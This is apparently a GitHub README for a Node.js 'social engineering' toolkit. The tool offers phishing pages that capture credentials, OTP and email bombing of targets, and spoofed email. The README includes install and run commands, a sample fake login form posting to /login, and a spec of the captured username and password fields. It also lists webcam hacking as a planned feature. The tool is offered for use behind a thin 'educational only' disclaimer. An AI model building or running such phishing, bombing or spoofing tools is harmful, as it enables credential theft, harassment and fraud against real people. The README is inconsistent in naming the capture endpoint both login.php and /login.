# SOCIAL ENGINEER 🎯🕵️‍♂️

A powerful social engineering toolkit that automates phishing, OTP/email bombing, fake mail and more — built with ❤️ by [@karthithehacker](https://karthithehacker.com)

![Main Menu](https://raw.githubusercontent.com/karthi-the-hacker/SocialEngineer/4982e91213338b6425de2379654786c8fa38cfc3/images/social-engineer.png)
> ⚠️ For educational use only. Do **not** use this tool against anyone without explicit permission.

---

## 📌 Features

* 🎯 **Phishing Attacks** – Simulate fake login pages to steal credentials
* 🔢 **OTP Bombing** – Flood OTP requests to a target number
* 📩 **Email Bombing** – Mass email sending to disrupt inboxes
* 📧 **Send Fake Email** – Custom spoofed email sender
* ❌ **Quit** – Exit the toolkit gracefully

(The keylogger and IP changer options have been removed in the JavaScript port.)

---

## 💻 Tech Stack

* **Language**: Node.js (JavaScript)
* **Libraries Used**:
  * `axios`
  * `chalk`
  * `ora`
  * `socket.io`
  * `uuid`



---

## 🗂️ Project Structure

```
SocialEngineering/
├── AttackModes/
│   ├── emailBombing.js
│   ├── emailspoofing.js
│   ├── otpBombing.js
│   ├── provider.js
│   └── … (other helpers)
├── includes/
│   ├── banner.js
│   ├── dbgateway.js
│   ├── menu.js
│   ├── phishing.js
│   └── utils.js
├── db/
│   └── Socialengineering-db.json
├── SocialEngineering.js        # main CLI entry
├── package.json
└── README.md
```

---

## 🚀 Usage

### 🔧 Installation

1. Clone the repository:

```bash
npm install SocialEngineering -g
```


### 📌 Running the tool

```bash

SocialEngineering
```

Sample menu:

```

███████╗ ██████╗  ██████╗██╗ █████╗ ██╗
██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║
███████╗██║   ██║██║     ██║███████║██║
╚════██║██║   ██║██║     ██║██╔══██║██║
███████║╚██████╔╝╚██████╗██║██║  ██║███████╗
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝

███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗███████╗██████╗ ██╗███╗   ██╗ ██████╗
██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝██╔════╝██╔══██╗██║████╗  ██║██╔════╝
█████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  █████╗  ██████╔╝██║██╔██╗ ██║██║  ███╗
██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  ██╔══╝  ██╔══██╗██║██║╚██╗██║██║   ██║
███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗███████╗██║  ██║██║██║ ╚████║╚██████╔╝
╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝

                                                           Website: cappriciosec.com
            Main Menu             
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ No. ┃ Option                     ┃
┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ 1   │ 🎯 Start Phishing Attack   │
│ 2   │ 📲 OTP Bombing             │
│ 3   │ 📩 Email Bombing           │
│ 4   │ 📧 Send Fake Email         │
│ 0   │ ❌ Quit                    │
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
👉 Select an option: 
```

---

## 🔧 Notes

* Phantom `templates/` folder is used by phishing module; you can add new templates following the structure:
  ```

  ~/SocialEngineering-Templates/
     ├── yourtemplatename/
         ├── index.html
         └── index.css
  ```
* The phishing server will serve files from the selected template and capture credentials via `/login`.

---


## 🧪 Example Fake Login Template (HTML)

### `index.html`

```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>XYZ Admin Login</title>
      <link rel="stylesheet" href="index.css">
    </head>
    <body>
      <form action="/login" method="post" class="login-box">
        <h2>Login</h2>
        <input type="text" name="username" placeholder="Username or Email" required>
        <input type="hidden" name="type" value="xyz"></input>
        <input type="password" name="password" placeholder="Password" required>
        <input type="submit" value="Login">
        <div class="note">fake template</div>
      </form>
    </body>
    </html>
```


## 📡 Phishing Portal Endpoint

The `login.php` endpoint receives credentials from fake  login pages (templates). When a user submits the login form, the server captures the following parameters:

### 📥 POST `/login`

| Parameter  | Type     | Description            |
|------------|----------|------------------------|
| `username` | `string` | **Required.** Username or email entered by the user |
| `password` | `string` | **Required.** Password entered by the user |
| `type` | `string` | **Required.** Template name set by developer |


---

## 🔮 Planned Features

> Coming Soon:

* 📞 Fake IVR Call
* 🛠️ Settings / Configuration Menu
* 🎥 Webcam Hacking

---

## 👨‍💻 Author

* Website: [karthithehacker.com](https://karthithehacker.com)
* GitHub: [@karthi-the-hacker](https://github.com/karthi-the-hacker)

---

## ⚠️ Disclaimer

This tool is intended **strictly for educational and ethical use**.
Do not use it to attack targets without prior consent.
The developer takes **no responsibility** for any misuse or illegal activity.
